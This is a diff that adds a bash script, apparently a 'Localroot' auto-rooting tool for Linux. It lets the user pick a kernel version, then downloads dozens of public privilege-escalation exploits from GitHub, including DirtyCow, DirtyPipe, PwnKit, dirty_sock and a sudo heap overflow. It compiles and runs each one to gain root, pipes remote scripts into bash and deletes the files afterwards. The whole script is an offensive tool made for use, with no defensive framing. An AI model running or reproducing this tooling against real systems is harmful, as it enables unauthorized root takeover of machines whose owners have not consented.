@@ -1,0 +1,382 @@
+#!/bin/bash
+#check gcc
+gcc=$(which gcc)
+if [ "$?" != "0" ]; then
+    FaIl="YES"
+    echo "[+] Gcc '->' not found!"
+    sleep 1
+    echo "exiting!"
+    exit
+else
+    echo "[+] Gcc    : found!"
+    sleep 1
+fi
+
+wget=$(which wget)
+if [ "$?" != "0" ]; then
+    FaIl="YES"
+    echo "[+] Wget '->' not found!"
+    sleep 1
+    echo "exiting!"
+    exit
+else
+    echo "[+] Wget    : found!"
+    sleep 1
+fi
+
+git=$(which git)
+if [ "$?" != "0" ]; then
+    echo "[-] Git -> not found!"
+    echo "[*] Continue ? (Y/N)"
+    read -p "haxor2020@Localroot:~# " jawab
+    if [ $jawab = "Y" || $jawab = "y" ];then
+    clear
+    else
+    FaIl="YES"
+    echo "[-] Git '->' not found!"
+    sleep 1
+    echo "exiting!"
+    exit
+    fi
+else
+    echo "[+] Git    : found!"
+    sleep 1
+fi
+
+clear
+echo "[x] Your Kernel : " 
+uname -a
+echo ""
+echo "[x] Choose Your Kernel : "
+echo "[1] 2x.x"
+echo "[2] 3x.x"
+echo "[3] 4x.x"
+echo "[4] 5x.x"
+echo "[5] TOP Exploit Root"
+echo "[6] Folder Exploit"
+read -p "haxor2020@Localroot:~# " localroot
+link="https://raw.githubusercontent.com/JlSakuya/Linux-Privilege-Escalation-Exploits/main/"
+
+kernel2=(
+    2004/caps_to_root/15916.c
+    2004/CVE-2004-0077/160.c
+    2004/CVE-2004-1235/744.c
+    2005/CVE-2005-0736/1397.c
+    2005/CVE-2005-1263/25647.sh
+    2006/CVE-2006-2451/2031.c
+    2006/CVE-2006-3626/2013.c
+    2008/CVE-2008-4210/6851.c
+    2009/CVE-2009-1185/8478.sh
+    2009/CVE-2009-1337/8369.sh
+    2016/CVE-2016-5195/exp-1/dirty.c
+
+)
+
+kernel3=(
+    2013/CVE-2013-0268/27297.c
+    2013/CVE-2013-1858/clown-newuser.c
+    2013/CVE-2013-2094/perf_swevent64.c
+    2014/CVE-2014-0038/timeoutpwn64
+    2014/CVE-2014-0196/cve-2014-0196-md.c
+    2014/CVE-2014-3153/exp-1/35370.c
+    2014/CVE-2014-3153/exp-2/towelroot.c
+    2014/CVE-2014-4699/34134.c
+    2014/CVE-2014-4014/33824.c
+    2014/CVE-2014-9322/procrop.c
+    2014/CVE-2014-9322/swapgs.c
+    2014/CVE-2014-9322/z_shell.c
+    2014/CVE-2014-9322/db.h
+    2014/CVE-2014-9322/setss.S
+    2015/CVE-2015-1328/37292.c
+    2015/CVE-2015-8660/39166.c
+    2016/CVE-2016-0728/cve-2016-0728.c
+    2016/CVE-2016-9793/poc.c
+    2017/CVE-2017-7308/poc.c
+    2022/CVE20222639/exploit.c
+    2022/CVE20222639/poc.c -O poc2.c
+)
+
+kernel4=(
+    2016/CVE-2016-8655/40871.c
+    2017/CVE-2017-6074/poc.c
+    2017/CVE-2017-16995/upstream44.c
+    2018/CVE-2018-5333/exploit.c
+    2019/CVE-2019-13272/CVE-2019-13272.c
+)
+
+kernel5x=(
+    2019/CVE-2019-15666/lucky0
+    2020/CVE-2020-8835/exp.c
+    2020/CVE-2020-8835/bpf.h
+    2021/CVE-2021-22555/exp-2/exploit.c
+    2022/CVE20220847/exp-1/exp.sh
+)
+
+topexploit=(
+    https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
+    https://raw.githubusercontent.com/Markakd/CVE-2022-2588/master/exp_file_credential
+    https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
+    https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh
+    https://raw.githubusercontent.com/n3rada/DirtyPipe/main/dpipe
+)
+
+# exploit kernel 2x
+if [ "$localroot" = "1" ]; then
+    echo "[+] Downloading Exploits..."
+
+    base_url="https://raw.githubusercontent.com/JlSakuya/Linux-Privilege-Escalation-Exploits/main"
+
+    for kernel22 in "${kernel2[@]}"; do
+        filename=$(basename "$kernel22")
+        wget -q --no-check-certificate "$base_url/$kernel22"
+        if [ -f "$filename" ]; then
+            echo "[+] Downloaded: $filename"
+        else
+            echo "[!] Failed to download: $kernel22"
+        fi
+    done
+
+    [ -f 15916.c ] && gcc -w 15916.c -o exploit && setcap cap_sys_admin ep exploit 2>/dev/null && ./exploit && rm -f exploit
+    [ -f 160.c ] && gcc -O3 -static -fomit-frame-pointer 160.c -o exploit && ./exploit && rm -f exploit
+    [ -f 744.c ] && gcc -O2 -fomit-frame-pointer 744.c -o exploit && ./exploit && rm -f exploit
+    [ -f 1397.c ] && gcc 1397.c -static -O2 -o exploit && ./exploit && rm -f exploit
+    [ -f 2031.c ] && gcc 2031.c -o exploit -static -Wall && ./exploit && rm -f exploit
+    [ -f 2013.c ] && gcc 2013.c -o exploit && ./exploit && rm -f exploit
+    [ -f 6851.c ] && gcc 6851.c -o exploit && ./exploit && rm -f exploit
+    [ -f dirty.c ] && gcc -pthread dirty.c -o dirty -lcrypt && ./dirty kontol1337 && rm -f dirty
+
+    [ -f 25647.sh ] && bash 25647.sh
+    [ -f 8478.sh ] && bash 8478.sh
+    [ -f 8369.sh ] && bash 8369.sh
+
+    echo "[+] Running CVE-2021-4034 exploit (PwnKit)"
+    curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh | bash
+
+    rm -f 25647.sh 8478.sh 8369.sh
+    rm -f *.c exploit dirty
+fi
+
+
+# exploit kernel 3x
+if [ "$localroot" = "2" ]; then
+    echo "[+] Get Material Download...."
+
+    base_url="https://raw.githubusercontent.com/JlSakuya/Linux-Privilege-Escalation-Exploits/main"
+
+    for kernel33 in "${kernel3[@]}"; do
+        wget -q --no-check-certificate "$base_url/$kernel33"
+    done
+
+    echo "[+] Exploit CVE-2021-4034"
+    sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
+    echo "[+] Wait Exploiting"
+
+    [ -f 37292.c ] && echo "[+] CVE-2015-1328" && gcc 37292.c -o exploit && ./exploit && rm -f exploit
+    [ -f 27297.c ] && echo "[+] CVE-2013-0268" && gcc 27297.c -o exploit && ./exploit && rm -f exploit
+    [ -f 39166.c ] && echo "[+] CVE-2015-8660" && gcc 39166.c -o exploit && ./exploit && rm -f exploit
+    [ -f clown-newuser.c ] && echo "[+] CVE-2013-1858" && gcc -Wall clown-newuser.c -static -o exploit && ./exploit && rm -f exploit
+    [ -f perf_swevent64.c ] && echo "[+] CVE-2013-2094" && gcc perf_swevent64.c -O2 -o exploit && ./exploit 0 && rm -f exploit
+    [ -f timeoutpwn64 ] && echo "[+] CVE-2014-0038" && chmod 0755 timeoutpwn64 && ./timeoutpwn64 && rm -f timeoutpwn64
+    [ -f cve-2014-0196-md.c ] && echo "[+] CVE-2014-0196" && gcc cve-2014-0196-md.c -lutil -lpthread -o exploit && ./exploit && rm -f exploit
+    [ -f 34134.c ] && echo "[+] CVE-2014-4699" && gcc -O2 34134.c -o exploit && ./exploit && rm -f exploit
+    [ -f 33824.c ] && echo "[+] CVE-2014-4014" && gcc 33824.c -o exploit && ./exploit && rm -f exploit
+    [ -f cve-2016-0728.c ] && echo "[+] CVE-2016-0728" && gcc cve-2016-0728.c -o exploit -lkeyutils -Wall && ./exploit && rm -f exploit
+
+    if [ -f z_shell.c ] && [ -f procrop.c ] && [ -f setss.S ] && [ -f swapgs.c ]; then
+        echo "[+] CVE-2014-9322"
+        gcc z_shell.c -o z_shell
+        gcc -o procrop procrop.c setss.S
+        gcc -o p_write8 swapgs.c setss.S -lpthread
+        ./procrop 1 &
+        ./p_write8 1
+        rm -f z_shell procrop p_write8
+    fi
+
+    [ -f poc.c ] && echo "[+] CVE-2016-9793" && gcc -pthread poc.c -o exploit && setcap cap_net_admin ep ./exploit && ./exploit && rm -f exploit
+
+    [ -f poc.c.1 ] && echo "[+] CVE-2017-7308" && mv poc.c.1 poc1.c && gcc poc1.c -o exploit && ./exploit && rm -f exploit
+
+    if [ -f exploit.c ] && [ -f poc.c.2 ]; then
+        echo "[+] CVE20222639"
+        mv poc.c.2 poc2.c
+        gcc exploit.c -o exploit -static -no-pie -s
+        gcc poc2.c -o poc -static -no-pie -Werror -s -Os -Wno-unused-result
+        ./poc
+        ./exploit
+        rm -f exploit poc
+    fi
+
+    [ -f 35370.c ] && echo "[+] CVE-2014-3153 (v1)" && gcc 35370.c -o exploit -lpthread && ./exploit && rm -f exploit
+    [ -f towelroot.c ] && echo "[+] CVE-2014-3153 (v2)" && gcc -fno-stack-protector -m32 -O0 -pthread towelroot.c -o exploit && ./exploit && rm -f exploit
+
+    rm -f *.c *.sh *.S exploit poc poc1 poc2 z_shell procrop p_write8 timeoutpwn64
+fi
+
+
+# exploit kernel 4
+if [ "$localroot" = "3" ]; then
+    echo "[+] Downloading kernel 4.x exploits..."
+
+    base_url="https://raw.githubusercontent.com/JlSakuya/Linux-Privilege-Escalation-Exploits/main"
+
+    for kernel44 in "${kernel4[@]}"; do
+        filename=$(basename "$kernel44")
+        wget -q --no-check-certificate "$base_url/$kernel44"
+        if [ -f "$filename" ]; then
+            echo "[+] Downloaded: $filename"
+        else
+            echo "[!] Failed to download: $kernel44"
+        fi
+    done
+
+    [ -f 40871.c ] && gcc 40871.c -o exploit -lpthread && ./exploit && rm -f exploit
+    [ -f poc.c ] && gcc poc.c -o exploit && ./exploit && rm -f exploit
+    [ -f upstream44.c ] && gcc upstream44.c -o exploit && ./exploit && rm -f exploit
+    [ -f exploit.c ] && gcc -O3 -pthread -static -g -masm=intel exploit.c -o exploit && ./exploit && rm -f exploit
+    [ -f CVE-2019-13272.c ] && gcc -s CVE-2019-13272.c -o exploit && ./exploit && rm -f exploit
+
+    rm -f *.c exploit
+fi
+
+
+# exploit kernel 5x
+if [ "$localroot" = "4" ]; then
+    echo "[+] Downloading kernel 5.x exploits..."
+
+    base_url="https://raw.githubusercontent.com/JlSakuya/Linux-Privilege-Escalation-Exploits/main"
+
+    for kernel55 in "${kernel5x[@]}"; do
+        filename=$(basename "$kernel55")
+        wget -q --no-check-certificate "$base_url/$kernel55"
+        if [ -f "$filename" ]; then
+            echo "[+] Downloaded: $filename"
+        else
+            echo "[!] Failed to download: $kernel55"
+        fi
+    done
+
+    [ -f exp.c ] && gcc exp.c -o exploit -static && ./exploit && rm -f exploit
+    [ -f exploit.c ] && gcc exploit.c -o exploit && ./exploit && rm -f exploit
+    [ -f exp.sh ] && chmod +x exp.sh && bash exp.sh
+
+    if [ -f lucky0 ]; then
+        chmod 0755 lucky0
+        while :; do
+            ./lucky0 -q && break
+        done
+    fi
+
+    rm -f *.c *.sh exploit lucky0
+fi
+
+
+# exploit top exploit
+if [ "$localroot" = "5" ]; then
+    echo "[+] Downloading Top Exploits..."
+    
+    for top in "${topexploit[@]}"; do
+        wget -q --no-check-certificate "$top"
+    done
+
+    echo "[+] Running downloaded exploits..."
+
+    [ -f exploit.c ] && gcc exploit.c -o exploit && chmod 0755 exploit && ./exploit && rm -f exploit
+    [ -f exp_file_credential ] && chmod 0755 exp_file_credential && ./exp_file_credential && rm -f exp_file_credential
+    [ -f PwnKit ] && chmod 0755 PwnKit && ./PwnKit && rm -f PwnKit
+    [ -f exploit.sh ] && bash exploit.sh && rm -f exploit.sh
+    [ -f dpipe ] && chmod +x dpipe && ./dpipe --root && rm -f dpipe
+
+    echo "[+] Cloning dirty_sock..."
+    git clone https://github.com/initstring/dirty_sock
+    if [ -d dirty_sock ]; then
+        cd dirty_sock
+        python3 dirty_sockv2.py
+        cd ..
+        rm -rf dirty_sock
+    fi
+
+    echo "[+] CVE-2021-33909 exploit..."
+    wget -q --no-check-certificate https://raw.githubusercontent.com/Liang2580/CVE-2021-33909/main/exploit.c
+    [ -f exploit.c ] && gcc exploit.c -o exploit && chmod +x exploit && ./exploit && rm -f exploit.c exploit
+
+    echo "[+] CVE-2022-37706 exploit..."
+    wget -q --no-check-certificate https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/main/exploit.sh
+    [ -f exploit.sh ] && bash exploit.sh && rm -f exploit.sh
+
+    echo "[+] CVE-2017-1000112 exploit..."
+    wget -q --no-check-certificate https://raw.githubusercontent.com/jollheef/lpe/master/CVE-2017-1000112/CVE-2017-1000112.c -O pwn.c
+    [ -f pwn.c ] && gcc pwn.c -o pwn && ./pwn && rm -f pwn.c pwn
+
+    echo "[+] CVE-2017-5899 exploit..."
+    wget -q --no-check-certificate https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2017-5899/exploit.sh
+    [ -f exploit.sh ] && bash exploit.sh && rm -f exploit.sh
+
+    echo "[+] Cloning and running CVE-2021-4154..."
+    git clone https://github.com/Markakd/CVE-2021-4154
+    if [ -d CVE-2021-4154 ]; then
+        cd CVE-2021-4154
+        gcc exp.c -o exp
+        gcc kctf_exp.c -o kctf
+        ./exp
+        ./kctf
+        cd ..
+        rm -rf CVE-2021-4154
+    fi
+
+    echo "[+] Cleanup..."
+    rm -f exploit exploit.c pwn pwn.c dpipe
+fi
+
+
+# exploit folder
+if [ "$localroot" = "6" ]; then
+    echo "[+] Cloning exploit repo..."
+    git clone https://github.com/JlSakuya/Linux-Privilege-Escalation-Exploits/ /tmp/Linux-Privilege-Escalation-Exploits
+
+    base="/tmp/Linux-Privilege-Escalation-Exploits"
+
+    declare -A exploits=(
+        ["2022/CVE-2022-0185/exp-1"]="make && ./exploit"
+        ["2022/CVE-2022-0185/exp-2"]="make && ./exploit"
+        ["2022/CVE-2022-0847/exp-1"]="bash exp.sh"
+        ["2022/CVE-2022-0847/exp-2"]="gcc dirtypipez.c -o dpipe -lpthread && ./dpipe /bin/su"
+        ["2022/CVE-2022-0847/exp-3"]="gcc exploit.c -o exploit && ./exploit /bin/sh dW5hbWUgLWE7aWQ="
+        ["2022/CVE-2022-0995"]="make && ./exploit"
+        ["2022/CVE-2022-1015"]="make && ./pwn"
+        ["2022/CVE-2022-23222"]="make && ./exploit"
+        ["2022/CVE-2022-25636/exp-1"]="make && ./exploit"
+        ["2022/CVE-2022-25636/exp-2"]="make && ./exploit"
+        ["2022/CVE-2022-2585"]="gcc exploit.c -o exploit -lpthread && ./exploit"
+        ["2022/CVE-2022-2586"]="gcc CVE-2022-2586.c -o exploit -lmnl -lnftnl -no-pie -lpthread && ./exploit"
+        ["2022/CVE-2022-2588"]="chmod +x exp_file_credential && ./exp_file_credential"
+        ["2022/CVE-2022-2602/exp-1"]="gcc exploit.c -o exploit -pthread && ./exploit"
+        ["2022/CVE-2022-2602/exp-2"]="make && ./poc_userfaultfd && ./poc_inode_locking"
+        ["2022/CVE-2022-2639"]="make && ./poc && ./exploit"
+        ["2022/CVE-2022-32250"]="gcc -lmnl -lnftnl exploit.c -o exploit && ./exploit"
+        ["2022/CVE-2022-34918/exp-1"]="make && ./poc"
+        ["2022/CVE-2022-34918/exp-2"]="make && ./exploit"
+        ["2019/CVE-2019-7304"]="python3 dirty_sockv2.py"
+        ["2019/CVE-2019-15666"]="chmod +x lucky0 && ./lucky0 -q"
+        ["2020/CVE-2020-8835"]="gcc exp.c -o exp -static && ./exp"
+        ["2021/CVE-2021-3156"]="make && ./exploit"
+        ["2021/CVE-2021-27365"]="make && cp a.sh /tmp/ && chmod +x /tmp/a.sh && ./exploit"
+        ["2017/CVE-2017-1000367"]="gcc -o sudopwn sudopwn.c -lutil && ./sudopwn"
+        ["2022/CVE-2022-27666"]="bash compile.sh && bash run.sh"
+    )
+
+    for path in "${!exploits[@]}"; do
+        fullpath="$base/$path"
+        if [ -d "$fullpath" ]; then
+            echo "[+] Running exploit: $path"
+            pushd "$fullpath" > /dev/null
+            eval "${exploits[$path]}"
+            popd > /dev/null
+        else
+            echo "[-] Directory not found: $fullpath"
+        fi
+        sleep 1
+    done
+
+    echo "[+] Cleanup..."
+    rm -rf /tmp/Linux-Privilege-Escalation-Exploits
+fi
